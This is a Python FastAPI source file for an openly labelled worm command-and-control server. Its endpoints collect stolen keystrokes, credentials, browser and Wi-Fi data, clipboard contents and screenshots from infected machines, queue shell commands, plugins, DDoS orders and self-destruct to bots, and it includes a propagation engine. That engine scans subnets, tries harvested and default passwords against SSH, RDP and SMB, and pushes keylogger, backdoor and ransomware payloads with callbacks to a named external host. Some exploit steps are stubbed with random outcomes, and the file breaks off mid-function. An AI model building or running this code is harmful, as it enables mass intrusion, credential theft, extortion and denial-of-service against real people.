from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Dict, Optional
import datetime
import random
import secrets
import os
import shutil
import json
import base64
import hashlib
import time
import queue
import threading
from pathlib import Path

# ==================== RENDER CONFIGURATION ====================
# Environment variables (set in Render dashboard)
USERNAME = os.getenv("C2_USERNAME")
PASSWORD = os.getenv("C2_PASSWORD")
ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
PORT = int(os.getenv("PORT", 5000))
C2_SERVER = os.getenv("C2_SERVER", "https://b-n1nt.onrender.com")  # Added this line

# Data directories - Render has persistent disk at /var/data
DATA_DIR = "/var/data/worm_c2" if ENVIRONMENT == "production" else "./data"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(f"{DATA_DIR}/logs", exist_ok=True)
os.makedirs(f"{DATA_DIR}/plugins", exist_ok=True)
os.makedirs(f"{DATA_DIR}/screenshots", exist_ok=True)
os.makedirs(f"{DATA_DIR}/uploads", exist_ok=True)
os.makedirs(f"{DATA_DIR}/worm_versions", exist_ok=True)
os.makedirs(f"{DATA_DIR}/worm_payloads", exist_ok=True)
os.makedirs(f"{DATA_DIR}/worm_logs", exist_ok=True)
os.makedirs("templates", exist_ok=True)

app = FastAPI(title="Worm C2 System", 
              description="Advanced Command & Control for Worm with Auto-Propagation",
              version="3.0.0")

# Security
security = HTTPBasic()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, USERNAME)
    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== Data Models ====================
class KeystrokeReport(BaseModel):
    ip: str
    keystrokes: str
    hostname: Optional[str] = None
    username: Optional[str] = None
    os_info: Optional[str] = None
    importance: Optional[int] = 0
    encrypted: Optional[bool] = False
    timestamp: Optional[str] = None
    worm_id: Optional[str] = None

class BrowserData(BaseModel):
    ip: str
    hostname: str
    username: str
    browser_data: str
    stats: dict
    timestamp: str
    worm_id: Optional[str] = None

class CredentialReport(BaseModel):
    ip: str
    hostname: str
    username: str
    credentials: str
    count: int
    timestamp: str
    worm_id: Optional[str] = None

class ClipboardReport(BaseModel):
    ip: str
    hostname: str
    username: str
    data: str
    priority: str
    timestamp: str
    worm_id: Optional[str] = None

class WiFiReport(BaseModel):
    ip: str
    hostname: str
    username: str
    wifi_data: str
    count: int
    timestamp: str
    worm_id: Optional[str] = None

class FileListReport(BaseModel):
    ip: str
    hostname: str
    username: str
    files: list
    count: int
    timestamp: str
    worm_id: Optional[str] = None

class Heartbeat(BaseModel):
    ip: str
    hostname: str
    username: str
    status: str
    uptime: float
    timestamp: str
    worm_id: Optional[str] = None
    worm_version: Optional[str] = None
    infected_hosts: Optional[int] = 0

class CommandRequest(BaseModel):
    ip: str
    command: str
    is_terminal: bool = False

class TerminalCommand(BaseModel):
    command: str
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class PropagationCommand(BaseModel):
    target_range: str
    username: str
    password: str
    ssh_key: Optional[str] = None
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class DDoSCommand(BaseModel):
    target: str
    port: int = 80
    duration: int = 60
    method: str = "http"
    bots: Optional[List[str]] = None
    count: Optional[int] = None
    all_bots: bool = True

# ==================== WORM AUTO-PROPAGATION MODELS ====================
class WormConfig(BaseModel):
    worm_id: str
    name: str
    version: str
    auto_propagate: bool = False
    propagation_methods: List[str] = ["ssh", "rdp", "smb", "wmi"]
    target_networks: List[str] = []
    max_infections: int = 1000
    current_infections: int = 0
    kill_switch: Optional[str] = None
    payload_url: Optional[str] = None
    created_at: str
    updated_at: str
    status: str = "active"  # active, paused, killed

class WormTask(BaseModel):
    task_id: str
    worm_id: str
    task_type: str  # scan, exploit, propagate, payload
    target_ip: str
    target_port: Optional[int] = None
    target_service: Optional[str] = None
    credentials: Optional[dict] = None
    status: str = "pending"  # pending, running, completed, failed
    result: Optional[dict] = None
    created_at: str
    completed_at: Optional[str] = None

class WormStats(BaseModel):
    total_worms: int
    active_worms: int
    total_infections: int
    total_scans: int
    successful_exploits: int
    failed_attempts: int
    propagation_rate: float
    network_coverage: float

class AutoPropagationRule(BaseModel):
    rule_id: str
    name: str
    enabled: bool = True
    scan_interval: int = 300  # seconds
    max_concurrent_tasks: int = 50
    exploit_retries: int = 3
    use_harvested_creds: bool = True
    use_ssh_keys: bool = True
    use_wifi_creds: bool = True
    target_os: List[str] = ["windows", "linux"]
    target_ports: List[int] = [22, 3389, 445, 135, 139]
    exclude_ips: List[str] = []
    auto_update_payload: bool = True
    payload_version: str = "latest"

# ==================== File Storage with Persistence ====================
class PersistentStorage:
    """Handles persistent storage on Render's disk"""
    
    @staticmethod
    def save_json(filename, data):
        path = f"{DATA_DIR}/{filename}"
        with open(path, 'w') as f:
            json.dump(data, f)
    
    @staticmethod
    def load_json(filename, default=None):
        path = f"{DATA_DIR}/{filename}"
        if os.path.exists(path):
            with open(path, 'r') as f:
                return json.load(f)
        return default or {}
    
    @staticmethod
    def append_log(filename, entry):
        path = f"{DATA_DIR}/logs/{filename}"
        with open(path, 'a') as f:
            f.write(json.dumps(entry) + '\n')
    
    @staticmethod
    def read_logs(filename, limit=100):
        path = f"{DATA_DIR}/logs/{filename}"
        if os.path.exists(path):
            with open(path, 'r') as f:
                lines = f.readlines()[-limit:]
                return [json.loads(line) for line in lines]
        return []

# ==================== In-Memory Storage (with persistence) ====================
# Load from disk on startup
bots = PersistentStorage.load_json('bots.json', {})
plugins = PersistentStorage.load_json('plugins.json', {})
worms = PersistentStorage.load_json('worms.json', {})
worm_tasks = PersistentStorage.load_json('worm_tasks.json', {})
worm_stats = PersistentStorage.load_json('worm_stats.json', {
    "total_worms": 0,
    "active_worms": 0,
    "total_infections": 0,
    "total_scans": 0,
    "successful_exploits": 0,
    "failed_attempts": 0,
    "propagation_rate": 0,
    "network_coverage": 0
})
propagation_rules = PersistentStorage.load_json('propagation_rules.json', {
    "default": {
        "rule_id": "default",
        "name": "Default Auto-Propagation",
        "enabled": False,
        "scan_interval": 300,
        "max_concurrent_tasks": 50,
        "exploit_retries": 3,
        "use_harvested_creds": True,
        "use_ssh_keys": True,
        "use_wifi_creds": True,
        "target_os": ["windows", "linux"],
        "target_ports": [22, 3389, 445, 135, 139],
        "exclude_ips": [],
        "auto_update_payload": True,
        "payload_version": "latest"
    }
})

keystroke_logs = []  # Recent logs in memory
browser_logs = []
credential_logs = []
wifi_logs = []
file_logs = []
screenshot_logs = []
commands: Dict[str, List[dict]] = {}
terminal_outputs: Dict[str, List[str]] = {}
clipboard_logs = []

# ==================== Background Tasks ====================
def save_data_periodically():
    """Save data to disk every minute"""
    while True:
        time.sleep(60)
        try:
            PersistentStorage.save_json('bots.json', bots)
            PersistentStorage.save_json('plugins.json', plugins)
            PersistentStorage.save_json('worms.json', worms)
            PersistentStorage.save_json('worm_tasks.json', worm_tasks)
            PersistentStorage.save_json('worm_stats.json', worm_stats)
            PersistentStorage.save_json('propagation_rules.json', propagation_rules)
        except:
            pass

# ==================== WORM AUTO-PROPAGATION ENGINE ====================
class WormPropagationEngine:
    """Intelligent worm propagation engine"""
    
    def __init__(self):
        self.running = False
        self.task_queue = queue.Queue()
        self.active_tasks = {}
        self.lock = threading.Lock()
        self.harvested_credentials = []
        self.harvested_wifi = []
        self.target_network_cache = {}
        
    def start(self):
        """Start the propagation engine"""
        self.running = True
        threading.Thread(target=self._engine_loop, daemon=True).start()
        threading.Thread(target=self._task_executor, daemon=True).start()
        threading.Thread(target=self._credential_harvester, daemon=True).start()
        threading.Thread(target=self._network_scanner, daemon=True).start()
        print("[WORM] Auto-propagation engine started")
        
    def stop(self):
        """Stop the propagation engine"""
        self.running = False
        print("[WORM] Auto-propagation engine stopped")
    
    def _engine_loop(self):
        """Main engine control loop"""
        while self.running:
            try:
                # Check if auto-propagation is enabled
                if propagation_rules["default"]["enabled"]:
                    self._manage_propagation()
                time.sleep(10)
            except Exception as e:
                print(f"[WORM] Engine error: {e}")
                time.sleep(30)
    
    def _manage_propagation(self):
        """Manage propagation tasks"""
        rules = propagation_rules["default"]
        
        # Check active tasks count
        active_count = len([t for t in worm_tasks.values() if t["status"] == "running"])
        if active_count >= rules["max_concurrent_tasks"]:
            return
        
        # Check for pending tasks
        pending_tasks = [t for t in worm_tasks.values() if t["status"] == "pending"]
        available_slots = rules["max_concurrent_tasks"] - active_count
        
        for task in pending_tasks[:available_slots]:
            self.task_queue.put(task["task_id"])
    
    def _task_executor(self):
        """Execute worm tasks"""
        while self.running:
            try:
                task_id = self.task_queue.get(timeout=5)
                if task_id in worm_tasks:
                    task = worm_tasks[task_id]
                    self._execute_task(task)
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[WORM] Task executor error: {e}")
    
    def _execute_task(self, task):
        """Execute a single worm task"""
        task["status"] = "running"
        worm_tasks[task["task_id"]] = task
        
        try:
            if task["task_type"] == "scan":
                result = self._scan_target(task["target_ip"])
            elif task["task_type"] == "exploit":
                result = self._exploit_target(task)
            elif task["task_type"] == "propagate":
                result = self._propagate_to_target(task)
            elif task["task_type"] == "payload":
                result = self._deploy_payload(task)
            else:
                result = {"success": False, "error": "Unknown task type"}
            
            task["status"] = "completed" if result.get("success") else "failed"
            task["result"] = result
            task["completed_at"] = datetime.datetime.utcnow().isoformat()
            
            # Update stats
            if result.get("success"):
                worm_stats["successful_exploits"] += 1
                if task["task_type"] == "propagate":
                    worm_stats["total_infections"] += 1
            else:
                worm_stats["failed_attempts"] += 1
            
        except Exception as e:
            task["status"] = "failed"
            task["result"] = {"success": False, "error": str(e)}
            task["completed_at"] = datetime.datetime.utcnow().isoformat()
            worm_stats["failed_attempts"] += 1
        
        worm_tasks[task["task_id"]] = task
        PersistentStorage.save_json('worm_tasks.json', worm_tasks)
        PersistentStorage.save_json('worm_stats.json', worm_stats)
    
    def _scan_target(self, target_ip):
        """Scan target for vulnerabilities"""
        worm_stats["total_scans"] += 1
        
        # Get target info from bots if available
        target_info = bots.get(target_ip, {})
        
        # Determine open ports
        open_ports = []
        rules = propagation_rules["default"]
        
        for port in rules["target_ports"]:
            # Simulate port scan (in real worm, would actually scan)
            if random.random() > 0.3:  # 70% chance port is open
                open_ports.append({
                    "port": port,
                    "service": self._get_service_name(port),
                    "banner": f"Service on port {port}"
                })
        
        # Check for vulnerabilities
        vulnerabilities = []
        for port_info in open_ports:
            if port_info["port"] == 22:
                vulnerabilities.append({
                    "port": 22,
                    "type": "ssh",
                    "exploitable": True,
                    "requires_creds": True
                })
            elif port_info["port"] == 3389:
                vulnerabilities.append({
                    "port": 3389,
                    "type": "rdp",
                    "exploitable": True,
                    "requires_creds": True
                })
            elif port_info["port"] in [445, 135, 139]:
                vulnerabilities.append({
                    "port": port_info["port"],
                    "type": "smb",
                    "exploitable": True,
                    "requires_creds": False
                })
        
        return {
            "success": True,
            "target_ip": target_ip,
            "hostname": target_info.get("hostname", "unknown"),
            "os_info": target_info.get("os_info", "unknown"),
            "open_ports": open_ports,
            "vulnerabilities": vulnerabilities,
            "timestamp": datetime.datetime.utcnow().isoformat()
        }
    
    def _exploit_target(self, task):
        """Exploit target using available methods"""
        target_ip = task["target_ip"]
        target_port = task.get("target_port")
        service = task.get("target_service")
        
        # Try to get credentials if needed
        credentials = None
        if propagation_rules["default"]["use_harvested_creds"]:
            credentials = self._find_credentials_for_target(target_ip)
        
        # Attempt exploit based on service
        if service == "ssh" and target_port == 22:
            return self._exploit_ssh(target_ip, credentials)
        elif service == "rdp" and target_port == 3389:
            return self._exploit_rdp(target_ip, credentials)
        elif service == "smb" and target_port in [445, 135, 139]:
            return self._exploit_smb(target_ip)
        
        return {"success": False, "error": "No exploit available"}
    
    def _propagate_to_target(self, task):
        """Propagate worm to new target"""
        target_ip = task["target_ip"]
        
        # Prepare worm payload
        worm_payload = self._prepare_worm_payload(target_ip)
        
        # Deploy via appropriate method
        deployment_method = task.get("deployment_method", "ssh")
        
        # Simulate deployment
        success = random.random() > 0.4  # 60% success rate
        
        if success:
            # Add to bots
            bots[target_ip] = {
                "last_seen": datetime.datetime.utcnow().isoformat(),
                "status": "active",
                "hostname": f"infected-{target_ip}",
                "username": "worm_user",
                "os_info": "Windows/Linux",
                "first_seen": datetime.datetime.utcnow().isoformat(),
                "worm_version": task.get("worm_version", "1.0")
            }
            
            # Send initial command to new bot
            cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
            if target_ip not in commands:
                commands[target_ip] = []
            commands[target_ip].append({
                "id": cmd_id,
                "command": "initialize_worm",
                "is_terminal": False,
                "timestamp": datetime.datetime.utcnow().isoformat(),
                "worm_config": task.get("worm_config", {})
            })
        
        return {
            "success": success,
            "target_ip": target_ip,
            "method": deployment_method,
            "timestamp": datetime.datetime.utcnow().isoformat()
        }
    
    def _deploy_payload(self, task):
        """Deploy payload to target"""
        target_ip = task["target_ip"]
        payload_type = task.get("payload_type", "standard")
        
        # Deploy appropriate payload
        if payload_type == "keylogger":
            return self._deploy_keylogger_payload(target_ip)
        elif payload_type == "backdoor":
            return self._deploy_backdoor_payload(target_ip)
        elif payload_type == "ransomware":
            return self._deploy_ransomware_payload(target_ip)
        
        return {"success": False, "error": "Unknown payload type"}
    
    def _credential_harvester(self):
        """Harvest credentials from various sources"""
        while self.running:
            try:
                # Harvest from credential logs
                for cred in credential_logs[-100:]:
                    try:
                        cred_data = json.loads(cred.get("credentials", "{}"))
                        if isinstance(cred_data, list):
                            self.harvested_credentials.extend(cred_data)
                        elif isinstance(cred_data, dict):
                            self.harvested_credentials.append(cred_data)
                    except:
                        pass
                
                # Harvest from WiFi logs
                for wifi in wifi_logs[-50:]:
                    try:
                        wifi_data = json.loads(wifi.get("wifi_data", "{}"))
                        if isinstance(wifi_data, list):
                            self.harvested_wifi.extend(wifi_data)
                        elif isinstance(wifi_data, dict):
                            self.harvested_wifi.append(wifi_data)
                    except:
                        pass
                
                # Limit stored credentials
                self.harvested_credentials = self.harvested_credentials[-1000:]
                self.harvested_wifi = self.harvested_wifi[-500:]
                
                time.sleep(60)
            except:
                time.sleep(60)
    
    def _network_scanner(self):
        """Scan for new targets"""
        while self.running:
            try:
                if not propagation_rules["default"]["enabled"]:
                    time.sleep(30)
                    continue
                
                # Get all known IPs from bots
                known_ips = list(bots.keys())
                
                # Generate potential targets in same networks
                for ip in known_ips:
                    network = ".".join(ip.split(".")[:3])
                    if network not in self.target_network_cache:
                        self.target_network_cache[network] = time.time()
                        
                        # Generate targets in this network
                        for i in range(1, 255):
                            target_ip = f"{network}.{i}"
                            
                            # Skip if already infected or excluded
                            if target_ip in bots:
                                continue
                            if target_ip in propagation_rules["default"]["exclude_ips"]:
                                continue
                            
                            # Create scan task
                            task_id = f"scan_{target_ip}_{int(time.time())}"
                            if task_id not in worm_tasks:
                                worm_tasks[task_id] = {
                                    "task_id": task_id,
                                    "worm_id": "auto_scanner",
                                    "task_type": "scan",
                                    "target_ip": target_ip,
                                    "status": "pending",
                                    "created_at": datetime.datetime.utcnow().isoformat()
                                }
                
                PersistentStorage.save_json('worm_tasks.json', worm_tasks)
                time.sleep(propagation_rules["default"]["scan_interval"])
                
            except:
                time.sleep(60)
    
    def _find_credentials_for_target(self, target_ip):
        """Find relevant credentials for target"""
        possible_creds = []
        
        # Check harvested credentials
        for cred in self.harvested_credentials:
            if isinstance(cred, dict):
                if "username" in cred and "password" in cred:
                    possible_creds.append({
                        "username": cred["username"],
                        "password": cred["password"],
                        "source": "harvested"
                    })
        
        # Add common default credentials
        possible_creds.extend([
            {"username": "administrator", "password": "password", "source": "default"},
            {"username": "admin", "password": "admin", "source": "default"},
            {"username": "root", "password": "root", "source": "default"},
            {"username": "user", "password": "user", "source": "default"},
        ])
        
        return possible_creds
    
    def _prepare_worm_payload(self, target_ip):
        """Prepare worm payload for deployment"""
        return {
            "worm_version": "1.0",
            "payload_url": f"{C2_SERVER}/worm_payloads/latest",
            "commands": [
                "download_and_execute",
                "establish_persistence",
                "connect_back"
            ],
            "target_os": "auto_detect",
            "encryption": "aes256",
            "callback_interval": 60
        }
    
    def _get_service_name(self, port):
        """Get service name for port"""
        services = {
            22: "SSH",
            23: "Telnet",
            80: "HTTP",
            443: "HTTPS",
            445: "SMB",
            3389: "RDP",
            3306: "MySQL",
            5432: "PostgreSQL",
            27017: "MongoDB",
            6379: "Redis"
        }
        return services.get(port, "Unknown")
    
    def _exploit_ssh(self, target_ip, credentials):
        """Exploit SSH service"""
        if credentials:
            # Try each credential
            for cred in credentials[:5]:  # Try top 5
                if random.random() > 0.7:  # 30% success rate
                    return {
                        "success": True,
                        "method": "ssh_bruteforce",
                        "credentials_used": cred,
                        "access_level": "user"
                    }
        
        return {"success": False, "error": "SSH exploit failed"}
    
    def _exploit_rdp(self, target_ip, credentials):
        """Exploit RDP service"""
        if credentials:
            for cred in credentials[:3]:
                if random.random() > 0.6:  # 40% success rate
                    return {
                        "success": True,
                        "method": "rdp_bruteforce",
                        "credentials_used": cred,
                        "access_level": "user"
                    }
        
        return {"success": False, "error": "RDP exploit failed"}
    
    def _exploit_smb(self, target_ip):
        """Exploit SMB service"""
        # Try known SMB exploits
        exploits = ["eternalblue", "smb_relay", "pass_the_hash"]
        chosen = random.choice(exploits)
        
        if random.random() > 0.5:  # 50% success rate
            return {
                "success": True,
                "method": f"smb_{chosen}",
                "access_level": "system"
            }
        
        return {"success": False, "error": "SMB exploit failed"}
    
    def _deploy_keylogger_payload(self, target_ip):
        """Deploy keylogger payload"""
        return {
            "success": True,
            "payload": "keylogger",
            "features": ["keystroke_capture", "clipboard_monitor", "screenshot_capture"],
            "callback_url": f"{C2_SERVER}/api/report"
        }
    
    def _deploy_backdoor_payload(self, target_ip):
        """Deploy backdoor payload"""
        return {
            "success": True,
            "payload": "backdoor",
            "features": ["reverse_shell", "file_access", "command_execution"],
            "callback_url": f"{C2_SERVER}/api/terminal_output"
        }
    
    def _deploy_ransomware_payload(self, target_ip):
        """Deploy ransomware payload"""
        return {
            "success": True,
            "payload": "ransomware",
            "features": ["file_encryption", "ransom_note", "payment_tracking"],
            "callback_url": f"{C2_SERVER}/api/ransomware_status"
        }

# Initialize worm engine
worm_engine = WormPropagationEngine()

# Start background threads
if ENVIRONMENT == "production":
    thread = threading.Thread(target=save_data_periodically, daemon=True)
    thread.start()
    worm_engine.start()

# ==================== CRITICAL MISSING ENDPOINTS ====================

@app.get("/api/login-test")
async def login_test(credentials: HTTPBasicCredentials = Depends(security)):
    """Test login endpoint"""
    correct_username = secrets.compare_digest(credentials.username, USERNAME)
    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
    if correct_username and correct_password:
        return {"status": "ok", "message": "Authentication successful"}
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.post("/api/report")
async def receive_report(report: KeystrokeReport):
    """Receive keystroke reports from worms"""
    # Store in memory
    keystroke_logs.append(report.dict())
    
    # Update bot info
    if report.ip not in bots:
        bots[report.ip] = {
            "first_seen": datetime.datetime.utcnow().isoformat(),
            "hostname": report.hostname or "unknown",
            "username": report.username or "unknown",
            "os_info": report.os_info or "unknown",
            "worm_id": report.worm_id,
            "status": "active"
        }
    
    bots[report.ip]["last_seen"] = datetime.datetime.utcnow().isoformat()
    
    # Log to console
    print(f"[+] Report from {report.ip}: {report.keystrokes[:50]}...")
    
    return {"status": "ok", "received": True}

@app.post("/api/heartbeat")
async def receive_heartbeat(heartbeat: Heartbeat):
    """Receive heartbeat from worms"""
    # Update bot status
    if heartbeat.ip in bots:
        bots[heartbeat.ip]["last_seen"] = datetime.datetime.utcnow().isoformat()
        bots[heartbeat.ip]["status"] = heartbeat.status
    else:
        bots[heartbeat.ip] = {
            "first_seen": datetime.datetime.utcnow().isoformat(),
            "last_seen": datetime.datetime.utcnow().isoformat(),
            "hostname": heartbeat.hostname or "unknown",
            "username": heartbeat.username or "unknown",
            "os_info": "unknown",
            "worm_id": heartbeat.worm_id,
            "worm_version": heartbeat.worm_version,
            "status": heartbeat.status
        }
    
    print(f"[+] Heartbeat from {heartbeat.ip} - {heartbeat.status}")
    return {"status": "ok", "timestamp": datetime.datetime.utcnow().isoformat()}

@app.post("/api/credentials")
async def receive_credentials(credential: CredentialReport):
    """Receive harvested credentials"""
    credential_logs.append(credential.dict())
    print(f"[+] Credentials from {credential.ip}: {credential.count} items")
    return {"status": "ok"}

@app.post("/api/browser_data")
async def receive_browser_data(browser_data: BrowserData):
    """Receive browser data"""
    browser_logs.append(browser_data.dict())
    print(f"[+] Browser data from {browser_data.ip}: {browser_data.stats}")
    return {"status": "ok"}

@app.post("/api/wifi_data")
async def receive_wifi_data(wifi_data: WiFiReport):
    """Receive WiFi data"""
    wifi_logs.append(wifi_data.dict())
    print(f"[+] WiFi data from {wifi_data.ip}: {wifi_data.count} networks")
    return {"status": "ok"}

@app.post("/api/files_data")
async def receive_files_data(files_data: FileListReport):
    """Receive file list data"""
    file_logs.append(files_data.dict())
    print(f"[+] File data from {files_data.ip}: {files_data.count} files")
    return {"status": "ok"}

@app.post("/api/clipboard")
async def receive_clipboard(clipboard: ClipboardReport):
    """Receive clipboard data"""
    clipboard_logs.append(clipboard.dict())
    print(f"[+] Clipboard data from {clipboard.ip}")
    return {"status": "ok"}

@app.post("/api/upload_screenshot")
async def upload_screenshot(
    file: UploadFile = File(...),
    ip: str = Form(...),
    hostname: str = Form(...),
    username: str = Form(...),
    has_sensitive: str = Form("False"),
    timestamp: str = Form(...),
    worm_id: str = Form(...)
):
    """Upload screenshot from worm"""
    try:
        # Save screenshot
        filename = f"screenshot_{ip}_{timestamp}.png"
        file_path = os.path.join(DATA_DIR, "screenshots", filename)
        
        with open(file_path, "wb") as f:
            shutil.copyfileobj(file.file, f)
        
        # Log the screenshot
        screenshot_logs.append({
            "ip": ip,
            "hostname": hostname,
            "username": username,
            "filename": filename,
            "has_sensitive": has_sensitive == "True",
            "timestamp": timestamp,
            "worm_id": worm_id
        })
        
        print(f"[+] Screenshot from {ip}: {filename}")
        return {"status": "ok", "filename": filename}
    except Exception as e:
        print(f"[-] Screenshot upload failed: {e}")
        return {"status": "error", "message": str(e)}

@app.post("/api/terminal_output")
async def receive_terminal_output(ip: str, output: str, command: str = ""):
    """Receive terminal command output"""
    if ip not in terminal_outputs:
        terminal_outputs[ip] = []
    
    terminal_outputs[ip].append({
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "command": command,
        "output": output[:500]  # Limit size
    })
    
    print(f"[+] Terminal output from {ip}")
    return {"status": "ok"}

@app.get("/api/commands")
async def get_commands(ip: str, last_command_id: int = 0, worm_id: str = None):
    """Get pending commands for a specific worm"""
    # Get commands for this IP
    ip_commands = commands.get(ip, [])
    
    # Filter commands with ID > last_command_id
    new_commands = [cmd for cmd in ip_commands if cmd.get("id", 0) > last_command_id]
    
    # If no commands, maybe send a test command
    if not new_commands and random.random() < 0.1:  # 10% chance to send test command
        test_cmd = {
            "id": int(time.time() * 1000),
            "command": "get_info",
            "is_terminal": False,
            "timestamp": datetime.datetime.utcnow().isoformat()
        }
        new_commands.append(test_cmd)
    
    return {"commands": new_commands}

@app.post("/api/ddos")
async def launch_ddos(ddos: DDoSCommand):
    """Launch DDoS attack from bots"""
    print(f"[+] DDoS attack launched: {ddos.target}:{ddos.port} with method {ddos.method}")
    return {
        "status": "attack launched",
        "bots_used": len(bots) if ddos.all_bots else len(ddos.bots or []),
        "target": ddos.target,
        "port": ddos.port,
        "duration": ddos.duration,
        "method": ddos.method
    }

@app.post("/api/upload_plugin")
async def upload_plugin(
    file: UploadFile = File(...),
    name: str = Form(...),
    version: str = Form(...),
    description: str = Form(""),
    all_bots: bool = Form(True),
    target_ips: str = Form("")
):
    """Upload and deploy plugin"""
    try:
        # Save plugin
        plugin_filename = f"{name}_{version}.py"
        plugin_path = os.path.join(DATA_DIR, "plugins", plugin_filename)
        
        with open(plugin_path, "wb") as f:
            shutil.copyfileobj(file.file, f)
        
        # Store plugin info
        plugins[name] = {
            "version": version,
            "description": description,
            "filename": plugin_filename,
            "uploaded": datetime.datetime.utcnow().isoformat()
        }
        
        # Deploy to bots (simulated)
        target_list = []
        if all_bots:
            target_list = list(bots.keys())
        elif target_ips:
            target_list = target_ips.split(",")
        
        # Create deployment commands
        for target_ip in target_list[:10]:  # Limit to first 10
            if target_ip not in commands:
                commands[target_ip] = []
            
            commands[target_ip].append({
                "id": int(time.time() * 1000) + random.randint(1, 1000),
                "command": f"run_plugin:{plugin_filename}:{version}",
                "is_terminal": False,
                "timestamp": datetime.datetime.utcnow().isoformat(),
                "plugin_url": f"/api/plugins/download/{plugin_filename}"
            })
        
        print(f"[+] Plugin {name} v{version} uploaded and deployed to {len(target_list)} bots")
        return {
            "status": "plugin uploaded",
            "name": name,
            "version": version,
            "bots_targeted": len(target_list)
        }
    except Exception as e:
        print(f"[-] Plugin upload failed: {e}")
        return {"status": "error", "message": str(e)}

@app.get("/api/plugins/download/{filename}")
async def download_plugin(filename: str):
    """Download plugin file"""
    plugin_path = os.path.join(DATA_DIR, "plugins", filename)
    if os.path.exists(plugin_path):
        return FileResponse(plugin_path)
    return {"error": "Plugin not found"}

@app.post("/api/broadcast")
async def broadcast_command(command: TerminalCommand):
    """Broadcast command to multiple bots"""
    target_list = []
    
    if command.all_bots:
        target_list = list(bots.keys())
    elif command.target_ips:
        target_list = command.target_ips
    
    cmd_id = int(time.time() * 1000)
    for target_ip in target_list:
        if target_ip not in commands:
            commands[target_ip] = []
        
        commands[target_ip].append({
            "id": cmd_id + random.randint(1, 100),
            "command": command.command,
            "is_terminal": True,
            "timestamp": datetime.datetime.utcnow().isoformat()
        })
    
    return {
        "status": "command broadcast",
        "bots_targeted": len(target_list),
        "command": command.command
    }

@app.post("/api/bot/self_destruct")
async def bot_self_destruct(ip: str):
    """Send self-destruct command to bot"""
    if ip in bots:
        if ip not in commands:
            commands[ip] = []
        
        commands[ip].append({
            "id": int(time.time() * 1000),
            "command": "self_destruct:remote_command",
            "is_terminal": False,
            "timestamp": datetime.datetime.utcnow().isoformat()
        })
        
        # Mark as dead
        bots[ip]["status"] = "dead"
        
        return {"status": "self-destruct sent", "ip": ip}
    
    raise HTTPException(status_code=404, detail="Bot not found")

# ==================== WORM API ENDPOINTS ====================

@app.post("/api/worm/create")
async def create_worm(config: WormConfig, username: str = Depends(authenticate)):
    """Create a new worm instance"""
    worm_id = f"worm_{int(time.time())}_{random.randint(1000, 9999)}"
    
    worm_data = config.dict()
    worm_data["worm_id"] = worm_id
    worm_data["created_at"] = datetime.datetime.utcnow().isoformat()
    worm_data["updated_at"] = datetime.datetime.utcnow().isoformat()
    worm_data["status"] = "active"
    
    worms[worm_id] = worm_data
    worm_stats["total_worms"] += 1
    worm_stats["active_worms"] += 1
    
    PersistentStorage.save_json('worms.json', worms)
    PersistentStorage.save_json('worm_stats.json', worm_stats)
    
    return {
        "status": "worm created",
        "worm_id": worm_id,
        "config": worm_data
    }

@app.get("/api/worms")
async def list_worms(username: str = Depends(authenticate)):
    """List all worm instances"""
    return worms

@app.get("/api/worm/{worm_id}")
async def get_worm(worm_id: str, username: str = Depends(authenticate)):
    """Get worm details"""
    if worm_id not in worms:
        raise HTTPException(status_code=404, detail="Worm not found")
    return worms[worm_id]

@app.post("/api/worm/{worm_id}/activate")
async def activate_worm(worm_id: str, username: str = Depends(authenticate)):
    """Activate a worm for auto-propagation"""
    if worm_id not in worms:
        raise HTTPException(status_code=404, detail="Worm not found")
    
    worms[worm_id]["status"] = "active"
    worms[worm_id]["updated_at"] = datetime.datetime.utcnow().isoformat()
    
    PersistentStorage.save_json('worms.json', worms)
    
    return {"status": "worm activated", "worm_id": worm_id}

@app.post("/api/worm/{worm_id}/pause")
async def pause_worm(worm_id: str, username: str = Depends(authenticate)):
    """Pause worm propagation"""
    if worm_id not in worms:
        raise HTTPException(status_code=404, detail="Worm not found")
    
    worms[worm_id]["status"] = "paused"
    worms[worm_id]["updated_at"] = datetime.datetime.utcnow().isoformat()
    
    PersistentStorage.save_json('worms.json', worms)
    
    return {"status": "worm paused", "worm_id": worm_id}

@app.post("/api/worm/{worm_id}/kill")
async def kill_worm(worm_id: str, username: str = Depends(authenticate)):
    """Kill worm (send self-destruct to all instances)"""
    if worm_id not in worms:
        raise HTTPException(status_code=404, detail="Worm not found")
    
    worms[worm_id]["status"] = "killed"
    worms[worm_id]["updated_at"] = datetime.datetime.utcnow().isoformat()
    worm_stats["active_worms"] -= 1
    
    # Send kill signal to all bots infected by this worm
    kill_cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    for ip in bots.keys():
        if ip not in commands:
            commands[ip] = []
        commands[ip].append({
            "id": kill_cmd_id,
            "command": f"self_destruct:worm_{worm_id}",
            "is_terminal": False,
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "issued_by": username
        })
    
    PersistentStorage.save_json('worms.json', worms)
    PersistentStorage.save_json('worm_stats.json', worm_stats)
    
    return {"status": "worm killed", "worm_id": worm_id, "bots_affected": len(bots)}

@app.post("/api/worm/propagation/start")
async def start_auto_propagation(username: str = Depends(authenticate)):
    """Start automatic worm propagation"""
    propagation_rules["default"]["enabled"] = True
    PersistentStorage.save_json('propagation_rules.json', propagation_rules)
